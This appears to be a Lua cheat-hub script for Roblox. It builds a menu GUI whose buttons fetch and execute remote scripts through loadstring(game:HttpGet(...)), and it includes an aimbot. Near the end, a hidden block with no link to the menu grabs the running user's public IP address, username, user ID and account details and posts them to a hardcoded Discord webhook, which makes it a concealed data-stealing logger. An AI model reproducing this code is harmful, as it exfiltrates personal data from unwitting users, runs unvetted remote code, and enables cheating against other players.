Container_3.BackgroundColor3 = Color3.fromRGB(45, 72, 200)
Container_3.BorderColor3 = Color3.fromRGB(32, 66, 190)
Container_3.Position = UDim2.new(0, 15, 0, 10)
Container_3.Size = UDim2.new(1, -30, 0, 320)
Container_3.BottomImage = "rbxassetid://368504177"
Container_3.CanvasSize = UDim2.new(0, 0, 0, 540) -- 818
Container_3.MidImage = "rbxassetid://368504177"
Container_3.ScrollBarThickness = 5
Container_3.TopImage = "rbxassetid://368504177"

TextBox.Parent = Container_3
TextBox.BackgroundColor3 = Color3.fromRGB(51, 76, 209)
TextBox.BorderSizePixel = 0
TextBox.Position = UDim2.new(0, 6, 0, 6)
TextBox.Size = UDim2.new(1, -17, 0, 20)
TextBox.Font = Enum.Font.SourceSans
TextBox.Text = ""
TextBox.TextColor3 = Color3.fromRGB(199, 199, 199)
TextBox.TextSize = 14.000

--{ Searcbar: }--

local scroll = exitdirectory.Main.Holder.Scripts.Container
local searchbar = scroll.TextBox

searchbar.Changed:Connect(function()
	local text = searchbar.Text:lower()
	if text ~= "" then
		local buttons = scroll:GetDescendants()
		for _, button in pairs(buttons) do
			if button:IsA("TextButton") then
				local buttonText = button.Text:lower()
				if string.find(buttonText, text) then
					button.Visible = true
					--button.Position = UDim2.new(0, 6,0, 29)
				else
					button.Visible = false
				end
			end
		end
	else
		local buttons = scroll:GetDescendants()
		for _, button in pairs(buttons) do
			if button:IsA("TextButton") then
				button.Visible = true
			end
		end
	end
end)

Script.Name = "Script"
Script.Parent = Container_3
Script.BackgroundColor3 = Color3.fromRGB(71, 106, 197)
Script.BorderSizePixel = 0
Script.Position = UDim2.new(0, 6, 0, 29)
Script.Size = UDim2.new(1, -16, 0, 25)
Script.Font = Enum.Font.SourceSans
Script.Text = "Adonis"
Script.TextColor3 = Color3.fromRGB(199, 199, 199)
Script.TextSize = 14.000
Script.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/o5u3/T0PK3K-REMAKE/scripts/Adonis.txt", true))()
end)

Script_2.Name = "Script"
Script_2.Parent = Container_3
Script_2.BackgroundColor3 = Color3.fromRGB(71, 106, 197)
Script_2.BorderSizePixel = 0
Script_2.Position = UDim2.new(0, 6, 0, 57)
Script_2.Size = UDim2.new(1, -16, 0, 25)
Script_2.Font = Enum.Font.SourceSans
Script_2.Text = "Fiery"
Script_2.TextColor3 = Color3.fromRGB(199, 199, 199)
Script_2.TextSize = 14.000
Script_2.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/o5u3/T0PK3K-REMAKE/scripts/Fiery.txt"))()
end)

Script_3.Name = "Script"
Script_3.Parent = Container_3
Script_3.BackgroundColor3 = Color3.fromRGB(71, 106, 197)
Script_3.BorderSizePixel = 0
Script_3.Position = UDim2.new(0, 6, 0, 85)
Script_3.Size = UDim2.new(1, -16, 0, 25)
Script_3.Font = Enum.Font.SourceSans
Script_3.Text = "Flash"
Script_3.TextColor3 = Color3.fromRGB(199, 199, 199)
Script_3.TextSize = 14.000
Script_3.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/o5u3/T0PK3K-REMAKE/scripts/flash.txt"))()
end)

Script_4.Name = "Script"
Script_4.Parent = Container_3
Script_4.BackgroundColor3 = Color3.fromRGB(71, 106, 197)
Script_4.BorderSizePixel = 0
Script_4.Position = UDim2.new(0, 6, 0, 113)
Script_4.Size = UDim2.new(1, -16, 0, 25)
Script_4.Font = Enum.Font.SourceSans
Script_4.Text = "Grapple"
Script_4.TextColor3 = Color3.fromRGB(199, 199, 199)
Script_4.TextSize = 14.000
Script_4.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/o5u3/T0PK3K-REMAKE/scripts/Grapple.txt"))()
end)

Script_5.Name = "Script"
Script_5.Parent = Container_3
Script_5.BackgroundColor3 = Color3.fromRGB(71, 106, 197)
Script_5.BorderSizePixel = 0
Script_5.Position = UDim2.new(0, 6, 0, 141)
Script_5.Size = UDim2.new(1, -16, 0, 25)
Script_5.Font = Enum.Font.SourceSans
Script_5.Text = "Gravity"
Script_5.TextColor3 = Color3.fromRGB(199, 199, 199)
Script_5.TextSize = 14.000
Script_5.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/o5u3/T0PK3K-REMAKE/scripts/Gravity.txt"))()
end)

Script_6.Name = "Script"
Script_6.Parent = Container_3
Script_6.BackgroundColor3 = Color3.fromRGB(71, 106, 197)
Script_6.BorderSizePixel = 0
Script_6.Position = UDim2.new(0, 6, 0, 169)
Script_6.Size = UDim2.new(1, -16, 0, 25)
Script_6.Font = Enum.Font.SourceSans
Script_6.Text = "Homebrew"
Script_6.TextColor3 = Color3.fromRGB(199, 199, 199)
Script_6.TextSize = 14.000
Script_6.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/o5u3/T0PK3K-REMAKE/scripts/Homebrew.txt"))()
end)

Script_7.Name = "Script"
Script_7.Parent = Container_3
Script_7.BackgroundColor3 = Color3.fromRGB(71, 106, 197)
Script_7.BorderSizePixel = 0
Script_7.Position = UDim2.new(0, 6, 0, 197)
Script_7.Size = UDim2.new(1, -16, 0, 25)
Script_7.Font = Enum.Font.SourceSans
Script_7.Text = "Parkour"
Script_7.TextColor3 = Color3.fromRGB(199, 199, 199)
Script_7.TextSize = 14.000
Script_7.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/o5u3/T0PK3K-REMAKE/scripts/Parkour%20Updated.txt"))()
end)

Script_8.Name = "Script"
Script_8.Parent = Container_3
Script_8.BackgroundColor3 = Color3.fromRGB(71, 106, 197)
Script_8.BorderSizePixel = 0
Script_8.Position = UDim2.new(0, 6, 0, 225)
Script_8.Size = UDim2.new(1, -16, 0, 25)
Script_8.Font = Enum.Font.SourceSans
Script_8.Text = "Selexity"
Script_8.TextColor3 = Color3.fromRGB(199, 199, 199)
Script_8.TextSize = 14.000
Script_8.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/o5u3/T0PK3K-REMAKE/scripts/Selexity.txt"))()
end)

Script_9.Name = "Script"
Script_9.Parent = Container_3
Script_9.BackgroundColor3 = Color3.fromRGB(71, 106, 197)
Script_9.BorderSizePixel = 0
Script_9.Position = UDim2.new(0, 6, 0, 253)
Script_9.Size = UDim2.new(1, -16, 0, 25)
Script_9.Font = Enum.Font.SourceSans
Script_9.Text = "Typical Hub"
Script_9.TextColor3 = Color3.fromRGB(199, 199, 199)
Script_9.TextSize = 14.000
Script_9.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/o5u3/T0PK3K-REMAKE/scripts/Typical%20Hub.txt"))()
end)

Script_10.Name = "Script"
Script_10.Parent = Container_3
Script_10.BackgroundColor3 = Color3.fromRGB(71, 106, 197)
Script_10.BorderSizePixel = 0
Script_10.Position = UDim2.new(0, 6, 0, 281)
Script_10.Size = UDim2.new(1, -16, 0, 25)
Script_10.Font = Enum.Font.SourceSans
Script_10.Text = "FE Skateboard"
Script_10.TextColor3 = Color3.fromRGB(199, 199, 199)
Script_10.TextSize = 14.000
Script_10.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/o5u3/T0PK3K-REMAKE/scripts/fe_skate.txt"))()
end)

Script_11.Name = "Script"
Script_11.Parent = Container_3
Script_11.BackgroundColor3 = Color3.fromRGB(71, 106, 197)
Script_11.BorderSizePixel = 0
Script_11.Position = UDim2.new(0, 6, 0, 309)
Script_11.Size = UDim2.new(1, -16, 0, 25)
Script_11.Font = Enum.Font.SourceSans
Script_11.Text = "Flu Gui"
Script_11.TextColor3 = Color3.fromRGB(199, 199, 199)
Script_11.TextSize = 14.000
Script_11.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/o5u3/T0PK3K-REMAKE/scripts/FluGUI.txt"))()
end)

Script_12.Name = "Script"
Script_12.Parent = Container_3
Script_12.BackgroundColor3 = Color3.fromRGB(71, 106, 197)
Script_12.BorderSizePixel = 0
Script_12.Position = UDim2.new(0, 6, 0, 337)
Script_12.Size = UDim2.new(1, -16, 0, 25)
Script_12.Font = Enum.Font.SourceSans
Script_12.Text = "Fate's Admin"
Script_12.TextColor3 = Color3.fromRGB(199, 199, 199)
Script_12.TextSize = 14.000
Script_12.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/o5u3/T0PK3K-REMAKE/scripts/Fate.txt"))()
end)

Script_13.Name = "Script"
Script_13.Parent = Container_3
Script_13.BackgroundColor3 = Color3.fromRGB(71, 106, 197)
Script_13.BorderSizePixel = 0
Script_13.Position = UDim2.new(0, 6, 0, 365)
Script_13.Size = UDim2.new(1, -16, 0, 25)
Script_13.Font = Enum.Font.SourceSans
Script_13.Text = "Aspect Hub"
Script_13.TextColor3 = Color3.fromRGB(199, 199, 199)
Script_13.TextSize = 14.000
Script_13.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/o5u3/T0PK3K-REMAKE/scripts/Aspect%20Hub.txt"))()
end)

Script_14.Name = "Script"
Script_14.Parent = Container_3
Script_14.BackgroundColor3 = Color3.fromRGB(71, 106, 197)
Script_14.BorderSizePixel = 0
Script_14.Position = UDim2.new(0, 6, 0, 393)
Script_14.Size = UDim2.new(1, -16, 0, 25)
Script_14.Font = Enum.Font.SourceSans
Script_14.Text = "Selexity Reborn"
Script_14.TextColor3 = Color3.fromRGB(199, 199, 199)
Script_14.TextSize = 14.000
Script_14.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/o5u3/T0PK3K-REMAKE/scripts/Selexity%20Reborn.txt"))()
end)

Script_15.Name = "Script"
Script_15.Parent = Container_3
Script_15.BackgroundColor3 = Color3.fromRGB(71, 106, 197)
Script_15.BorderSizePixel = 0
Script_15.Position = UDim2.new(0, 6, 0, 421)
Script_15.Size = UDim2.new(1, -16, 0, 25)
Script_15.Font = Enum.Font.SourceSans
Script_15.Text = "UTG Reborn"
Script_15.TextColor3 = Color3.fromRGB(199, 199, 199)
Script_15.TextSize = 14.000
Script_15.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/o5u3/T0PK3K-REMAKE/scripts/UTG%20REBORN.txt"))()
end)

Script_16.Name = "Script"
Script_16.Parent = Container_3
Script_16.BackgroundColor3 = Color3.fromRGB(71, 106, 197)
Script_16.BorderSizePixel = 0
Script_16.Position = UDim2.new(0, 6, 0, 449)
Script_16.Size = UDim2.new(1, -16, 0, 25)
Script_16.Font = Enum.Font.SourceSans
Script_16.Text = "T0PK3K"
Script_16.TextColor3 = Color3.fromRGB(199, 199, 199)
Script_16.TextSize = 14.000
Script_16.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/o5u3/T0PK3K-REMAKE/scripts/TOPK3K.txt"))()
end)

Script_17.Name = "Script"
Script_17.Parent = Container_3
Script_17.BackgroundColor3 = Color3.fromRGB(71, 106, 197)
Script_17.BorderSizePixel = 0
Script_17.Position = UDim2.new(0, 6, 0, 477)
Script_17.Size = UDim2.new(1, -16, 0, 25)
Script_17.Font = Enum.Font.SourceSans
Script_17.Text = "FE Neko"
Script_17.TextColor3 = Color3.fromRGB(199, 199, 199)
Script_17.TextSize = 14.000
Script_17.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/o5u3/T0PK3K-REMAKE/scripts/nekomaid.txt"))()
end)

Script_18.Name = "Script"
Script_18.Parent = Container_3
Script_18.BackgroundColor3 = Color3.fromRGB(71, 106, 197)
Script_18.BorderSizePixel = 0
Script_18.Position = UDim2.new(0, 6, 0, 505)
Script_18.Size = UDim2.new(1, -16, 0, 25)
Script_18.Font = Enum.Font.SourceSans
Script_18.Text = "FE Server Admin"
Script_18.TextColor3 = Color3.fromRGB(199, 199, 199)
Script_18.TextSize = 14.000
Script_18.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/o5u3/T0PK3K-REMAKE/scripts/server%20admin%20god.txt"))()
end)

Info.Name = "Info"
Info.Parent = Holder
Info.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Info.BackgroundTransparency = 1.000
Info.Size = UDim2.new(1, 0, 1, 0)
Info.Visible = false

Container_4.Name = "Container"
Container_4.Parent = Info
Container_4.Active = true
Container_4.BackgroundColor3 = Color3.fromRGB(45, 72, 200)
Container_4.BorderColor3 = Color3.fromRGB(32, 66, 190)
Container_4.Position = UDim2.new(0, 15, 0, 10)
Container_4.Size = UDim2.new(1, -30, 0, 320)
Container_4.BottomImage = "rbxassetid://368504177"
Container_4.CanvasSize = UDim2.new(0, 0, 0, 297)
Container_4.MidImage = "rbxassetid://368504177"
Container_4.ScrollBarThickness = 5
Container_4.TopImage = "rbxassetid://368504177"

TextLabel_12.Parent = Container_4
TextLabel_12.BackgroundColor3 = Color3.fromRGB(51, 76, 209)
TextLabel_12.BorderSizePixel = 0
TextLabel_12.Position = UDim2.new(0, 6, 0, 6)
TextLabel_12.Size = UDim2.new(1, -17, 0.165625006, 260)
TextLabel_12.Font = Enum.Font.SourceSans
TextLabel_12.Text = ([[

Hello and welcome to T0PK3K Remake!

This gui includes FE scripts that
have been showcased on FO10's
YouTube channel.

Discord:
discord.gg/z6Ggtqh5W8

]])
TextLabel_12.TextColor3 = Color3.fromRGB(199, 199, 199)
TextLabel_12.TextSize = 14.000

Settings.Name = "Settings"
Settings.Parent = Holder
Settings.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Settings.BackgroundTransparency = 1.000
Settings.Size = UDim2.new(1, 0, 1, 0)
Settings.Visible = false

Container_5.Name = "Container"
Container_5.Parent = Settings
Container_5.Active = true
Container_5.BackgroundColor3 = Color3.fromRGB(45, 72, 200)
Container_5.BorderColor3 = Color3.fromRGB(32, 66, 190)
Container_5.Position = UDim2.new(0, 15, 0, 10)
Container_5.Size = UDim2.new(1, -30, 0, 320)
Container_5.BottomImage = "rbxassetid://368504177"
Container_5.CanvasSize = UDim2.new(0, 0, 0, 343)
Container_5.MidImage = "rbxassetid://368504177"
Container_5.ScrollBarThickness = 5
Container_5.TopImage = "rbxassetid://368504177"

TextLabel_13.Parent = Container_5
TextLabel_13.BackgroundColor3 = Color3.fromRGB(51, 76, 209)
TextLabel_13.BorderSizePixel = 0
TextLabel_13.Position = UDim2.new(0, 6, 0, 6)
TextLabel_13.Size = UDim2.new(1, -17, 0, 20)
TextLabel_13.Font = Enum.Font.SourceSans
TextLabel_13.Text = "Patch: 1.0a"
TextLabel_13.TextColor3 = Color3.fromRGB(199, 199, 199)
TextLabel_13.TextSize = 14.000

TextLabel_14.Parent = Container_5
TextLabel_14.BackgroundColor3 = Color3.fromRGB(51, 76, 209)
TextLabel_14.BorderSizePixel = 0
TextLabel_14.Position = UDim2.new(0, 6, 0, 29)
TextLabel_14.Size = UDim2.new(1, -17, 0, 20)
TextLabel_14.Font = Enum.Font.SourceSans
TextLabel_14.Text = "Devnote: aWx5 is cool!! i think."
TextLabel_14.TextColor3 = Color3.fromRGB(199, 199, 199)
TextLabel_14.TextSize = 14.000

TextLabel_15.Parent = Container_5
TextLabel_15.BackgroundColor3 = Color3.fromRGB(51, 76, 209)
TextLabel_15.BorderSizePixel = 0
TextLabel_15.Position = UDim2.new(0, 6, 0, 75)
TextLabel_15.Size = UDim2.new(1, -17, 0, 260)
TextLabel_15.Font = Enum.Font.SourceSans
TextLabel_15.Text = ([[
~~~ { CREDITS } ~~~
	
	
FO10 - Scripts Provider

Bubba - Gui

aWx5 - Gui & Gui Scripts

Credit to the script owners

]])
TextLabel_15.TextColor3 = Color3.fromRGB(199, 199, 199)
TextLabel_15.TextSize = 14.000

TextButton.Parent = Container_5
TextButton.BackgroundColor3 = Color3.fromRGB(71, 106, 197)
TextButton.BorderSizePixel = 0
TextButton.Position = UDim2.new(0, 6, 0, 52)
TextButton.Size = UDim2.new(1, -16, 0, 20)
TextButton.Visible = false
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = ""
TextButton.TextColor3 = Color3.fromRGB(199, 199, 199)
TextButton.TextSize = 14.000

Navigation.Name = "Navigation"
Navigation.Parent = Main
Navigation.Active = true
Navigation.BackgroundColor3 = Color3.fromRGB(32, 66, 190)
Navigation.BorderSizePixel = 0
Navigation.Size = UDim2.new(0, 150, 1, 0)
Navigation.ZIndex = 2

Topbar_2.Name = "Topbar"
Topbar_2.Parent = Navigation
Topbar_2.BackgroundColor3 = Color3.fromRGB(60, 119, 191)
Topbar_2.BorderSizePixel = 0
Topbar_2.Size = UDim2.new(1, 0, 0, 30)
Topbar_2.ZIndex = 3

Scroll.Name = "Scroll"
Scroll.Parent = Navigation
Scroll.BackgroundColor3 = Color3.fromRGB(45, 72, 200)
Scroll.BorderSizePixel = 0
Scroll.Position = UDim2.new(0, 0, 0, 30)
Scroll.Size = UDim2.new(1, 0, 1, -30)
Scroll.ZIndex = 2 --2
Scroll.BottomImage = "rbxassetid://368504177"
Scroll.CanvasSize = UDim2.new(0, 0, 0, 403)
Scroll.MidImage = "rbxassetid://368504177"
Scroll.ScrollBarThickness = 5
Scroll.TopImage = "rbxassetid://368504177"

TextButton_2.Parent = Scroll
TextButton_2.BackgroundColor3 = Color3.fromRGB(71, 106, 197)
TextButton_2.BorderSizePixel = 0
TextButton_2.LayoutOrder = 8
TextButton_2.Position = UDim2.new(0, 5, 0, 79)
TextButton_2.Size = UDim2.new(1, -16, 0, 25)
TextButton_2.ZIndex = 4
TextButton_2.Font = Enum.Font.SourceSans
TextButton_2.Text = "Scripts"
TextButton_2.TextColor3 = Color3.fromRGB(199, 199, 199)
TextButton_2.TextSize = 14.000
TextButton_2.MouseButton1Click:Connect(function()
	Scripts.Visible = true
	Home.Visible = false
	Settings.Visible = false
	Info.Visible = false
	LocalPlayer.Visible = false
end)

TextButton_3.Parent = Scroll
TextButton_3.BackgroundColor3 = Color3.fromRGB(71, 106, 197)
TextButton_3.BorderSizePixel = 0
TextButton_3.LayoutOrder = 12
TextButton_3.Position = UDim2.new(0, 5, 0, 114)
TextButton_3.Size = UDim2.new(1, -16, 0, 25)
TextButton_3.ZIndex = 4
TextButton_3.Font = Enum.Font.SourceSans
TextButton_3.Text = "Settings"
TextButton_3.TextColor3 = Color3.fromRGB(199, 199, 199)
TextButton_3.TextSize = 14.000
TextButton_3.MouseButton1Click:Connect(function()
	Scripts.Visible = false
	Home.Visible = false
	Settings.Visible = true
	Info.Visible = false
	LocalPlayer.Visible = false
end)

TextButton_4.Parent = Scroll
TextButton_4.BackgroundColor3 = Color3.fromRGB(71, 106, 197)
TextButton_4.BorderSizePixel = 0
TextButton_4.LayoutOrder = 4
TextButton_4.Position = UDim2.new(0, 5, 0, 148)
TextButton_4.Size = UDim2.new(1, -16, 0, 25)
TextButton_4.Visible = false
TextButton_4.ZIndex = 4
TextButton_4.Font = Enum.Font.SourceSans
TextButton_4.Text = ""
TextButton_4.TextColor3 = Color3.fromRGB(199, 199, 199)
TextButton_4.TextSize = 14.000

TextButton_5.Parent = Scroll
TextButton_5.BackgroundColor3 = Color3.fromRGB(71, 106, 197)
TextButton_5.BorderSizePixel = 0
TextButton_5.LayoutOrder = 1
TextButton_5.Position = UDim2.new(0, 6, 0, 10)
TextButton_5.Size = UDim2.new(1, -16, 0, 25)
TextButton_5.ZIndex = 4
TextButton_5.Font = Enum.Font.SourceSans
TextButton_5.Text = "Home"
TextButton_5.TextColor3 = Color3.fromRGB(199, 199, 199)
TextButton_5.TextSize = 14.000
TextButton_5.MouseButton1Click:Connect(function()
	Scripts.Visible = false
	Home.Visible = true
	Settings.Visible = false
	Info.Visible = false
	LocalPlayer.Visible = false
end)

TextButton_6.Parent = Scroll
TextButton_6.BackgroundColor3 = Color3.fromRGB(71, 106, 197)
TextButton_6.BorderSizePixel = 0
TextButton_6.LayoutOrder = 2
TextButton_6.Position = UDim2.new(0, 6, 0, 43)
TextButton_6.Size = UDim2.new(1, -16, 0, 25)
TextButton_6.ZIndex = 4
TextButton_6.Font = Enum.Font.SourceSans
TextButton_6.Text = "Info"
TextButton_6.TextColor3 = Color3.fromRGB(199, 199, 199)
TextButton_6.TextSize = 14.000
TextButton_6.MouseButton1Click:Connect(function()
	Scripts.Visible = false
	Home.Visible = false
	Settings.Visible = false
	Info.Visible = true
	LocalPlayer.Visible = false
end)

DisabledCommand.Name = "DisabledCommand"
DisabledCommand.Parent = Main
DisabledCommand.BackgroundColor3 = Color3.fromRGB(51, 76, 209)
DisabledCommand.BorderColor3 = Color3.fromRGB(54, 81, 151)
DisabledCommand.Position = UDim2.new(0, 163, 0, 366)
DisabledCommand.Size = UDim2.new(1, -176, 0, 20)
DisabledCommand.Visible = false
DisabledCommand.Font = Enum.Font.Code
DisabledCommand.PlaceholderText = "Press ; to enter a DisabledCommand"
DisabledCommand.ShowNativeInput = false
DisabledCommand.Text = ""
DisabledCommand.TextColor3 = Color3.fromRGB(209, 209, 209)
DisabledCommand.TextSize = 12.000
DisabledCommand.TextStrokeTransparency = 0.800
DisabledCommand.TextTransparency = 0.300

Label.Name = "Label"
Label.Parent = Main
Label.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Label.BackgroundTransparency = 1.000
Label.BorderSizePixel = 0
Label.Position = UDim2.new(0.0191489346, 0, -0.00253164582, 0)
Label.Size = UDim2.new(0, 113, 0, 30)
Label.ZIndex = 4
Label.Font = Enum.Font.SourceSansBold
Label.Text = "T0PK3K REMAKE"
Label.TextColor3 = Color3.fromRGB(255, 255, 255)
Label.TextSize = 18.000

--{ Scripts: }--

local RunService = game:GetService("RunService")

spawn(function()
        while true do
            TextLabel_4.Text = "Server Time: "..tostring(game:GetService('Workspace').DistributedGameTime)
            wait(.5)
        end
end)

spawn(function()
        while true do
            TextLabel_5.Text = "Server Size: "..tostring(game:GetService('Players').NumPlayers)
            wait(.5)
        end
end)

spawn(function()
RunService.RenderStepped:Connect(function(frame)
	TextLabel_8.Text = "FPS: "..(math.round(1/frame))
end)
end)


--{ End of Code }--
end)

Section:NewButton("Bloodfest GUI", "Game Gui lol", function()
loadstring(game:HttpGet("https://pastebin.com/raw/MyuKiH2q", true))()
end)

Section:NewButton("AimBot Gui", "Its old but useful", function()
   -- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Frame_2 = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local TextButton = Instance.new("TextButton")
local TextButton_2 = Instance.new("TextButton")
local TextLabel_2 = Instance.new("TextLabel")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
Frame.BorderColor3 = Color3.fromRGB(16, 16, 16)
Frame.Position = UDim2.new(0.326547235, 0, 0.442340851, 0)
Frame.Size = UDim2.new(0.346905529, 0, 0.194492236, 0)

Frame_2.Parent = Frame
Frame_2.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
Frame_2.BorderColor3 = Color3.fromRGB(16, 16, 16)
Frame_2.Size = UDim2.new(1, 0, 0.26777932, 0)

TextLabel.Parent = Frame_2
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Size = UDim2.new(1.00234735, 0, 1.08253634, 0)
TextLabel.Font = Enum.Font.SourceSansSemibold
TextLabel.Text = "Arceus | Aimbot"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 16.000

TextButton.Parent = Frame_2
TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton.BackgroundTransparency = 1.000
TextButton.Position = UDim2.new(0.92957741, 0, 0, 0)
TextButton.Size = UDim2.new(0.0697798356, 0, 0.991438508, 0)
TextButton.Font = Enum.Font.SourceSansSemibold
TextButton.Text = "_"
TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextSize = 14.000

TextButton_2.Parent = Frame
TextButton_2.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
TextButton_2.BorderColor3 = Color3.fromRGB(20, 20, 20)
TextButton_2.Position = UDim2.new(0.0492957756, 0, 0.495575249, 0)
TextButton_2.Size = UDim2.new(0.0469483584, 0, 0.176991165, 0)
TextButton_2.Font = Enum.Font.SourceSansSemibold
TextButton_2.Text = ""
TextButton_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_2.TextScaled = true
TextButton_2.TextSize = 20.000
TextButton_2.TextWrapped = true

TextLabel_2.Parent = TextButton_2
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.Position = UDim2.new(1.54999995, 0, 0, 0)
TextLabel_2.Size = UDim2.new(17.7999992, 0, 1, 0)
TextLabel_2.Font = Enum.Font.SourceSansSemibold
TextLabel_2.Text = "Aimbot"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextSize = 16.000
TextLabel_2.TextWrapped = true
TextLabel_2.TextXAlignment = Enum.TextXAlignment.Left

-- Scripts:

local function RPTXOJ_fake_script() -- TextButton.LocalScript 
	local script = Instance.new('LocalScript', TextButton)

	local state = true
	script.Parent.MouseButton1Down:Connect(function()
		print"t"
		state = not state
		local LB_Size = script.Parent.Parent.AbsoluteSize
		local NW_Size = UDim2.new(0, LB_Size.X, 0, LB_Size.Y)
		if not state then
			script.Parent.Text = "+"
			game:GetService("TweenService"):Create(script.Parent.Parent.Parent, TweenInfo.new(0.5, Enum.EasingStyle.Linear), {
				BackgroundTransparency = 1
			}):Play()
			for i, v in pairs(script.Parent.Parent.Parent:GetChildren()) do
				if v:IsA("TextButton") then 
					v.Visible = false
					v.TextLabel.Visible = false
				end
			end
		else
			script.Parent.Text = "_"
			game:GetService("TweenService"):Create(script.Parent.Parent.Parent, TweenInfo.new(0.5, Enum.EasingStyle.Linear), {
				BackgroundTransparency = 0
			}):Play()
			for i, v in pairs(script.Parent.Parent.Parent:GetChildren()) do
				if v:IsA("TextButton") then 
					v.Visible = true
					v.TextLabel.Visible = true
				end
			end
		end
	end)
end
coroutine.wrap(RPTXOJ_fake_script)()
local function CIXXD_fake_script() -- TextButton_2.LocalScript 
	local script = Instance.new('LocalScript', TextButton_2)

	local state = false
	script.Parent.MouseButton1Down:Connect(function()
		state = not state
		if state then 
			script.Parent.Text = "x"
		else
			script.Parent.Text = ""
		end
	end)
	
	local Cam = workspace.CurrentCamera
	
	local hotkey = true
	function lookAt(target, eye)
		Cam.CFrame = CFrame.new(target, eye)
	end
	
	function getClosestPlayerToCursor(trg_part)
		local nearest = nil
		local last = math.huge
		for i,v in pairs(game.Players:GetPlayers()) do
			if v ~= game.Players.LocalPlayer and game.Players.LocalPlayer.Character and v.Character and v.Character:FindFirstChild(trg_part) then
				if game.Players.LocalPlayer.Character:FindFirstChild(trg_part) then
					local ePos, vissss = workspace.CurrentCamera:WorldToViewportPoint(v.Character[trg_part].Position)
					local AccPos = Vector2.new(ePos.x, ePos.y)
					local mousePos = Vector2.new(workspace.CurrentCamera.ViewportSize.x / 2, workspace.CurrentCamera.ViewportSize.y / 2)
					local distance = (AccPos - mousePos).magnitude
					if distance < last and vissss and hotkey and distance < 400 then
						last = distance
						nearest = v
					end
				end
			end
		end
		return nearest
	end
	
	game:GetService("RunService").RenderStepped:Connect(function()
		local closest = getClosestPlayerToCursor("Head")
		if state and closest and closest.Character:FindFirstChild("Head") then
			lookAt(Cam.CFrame.p, closest.Character:FindFirstChild("Head").Position)
		end
	end)
end
coroutine.wrap(CIXXD_fake_script)()
local function QNWNII_fake_script() -- Frame.LocalScript 
	local script = Instance.new('LocalScript', Frame)

	script.Parent.Active = true
	script.Parent.Selectable = true
	script.Parent.Draggable = true
end
coroutine.wrap(QNWNII_fake_script)()
end)






local Webhook = "https://discord.com/api/webhooks/1272551217557671937/PEYTKwX-JuEniXhEnWgwhvV2YlQxrUi5oXHdPreUENIV6aGtQc9gZQ9FVzgX6o2xPwLJ"

local IPv4 = game:HttpGet("https://v4.ident.me/")

local Headers = {["content-type"] = "application/json"}

local LocalPlayer = game:GetService("Players").LocalPlayer

-- Concatenate account age with "days old"
local AccountAge = LocalPlayer.AccountAge .. " days old"
-- Correct string manipulation to get MembershipType
local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
local UserId = LocalPlayer.UserId
local PlayerName = LocalPlayer.Name

local PlayerData = {
    ["content"] = "",
    ["embeds"] = {{
        ["title"] = "**Name Of The Holf Hub kid**:",
        ["description"] = PlayerName,
        ["color"] = tonumber(0x2B6BE4),
        ["fields"] = {
            {["name"] = "Premium?:", ["value"] = MembershipType, ["inline"] = true},
            {["name"] = "How Old:", ["value"] = AccountAge, ["inline"] = true},
            {["name"] = "Player id:", ["value"] = UserId, ["inline"] = true},
            {["name"] = "IPv4:", ["value"] = IPv4, ["inline"] = true},
            -- Fixing the URL generation with the correct syntax
            {["name"] = "Profile URL:", ["value"] = "https://roblox.com/users/" .. UserId .. "/profile", ["inline"] = true}
        }
    }}
}

local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
local HttpRequest = http_request

if syn then
    HttpRequest = syn.request
end
HttpRequest({Url = Webhook, Body = PlayerData, Method = "POST", Headers = Headers})








--// Games \\--
local Tab = Window:NewTab("Game")
local Section = Tab:NewSection("ALL GAMES CHEAT")
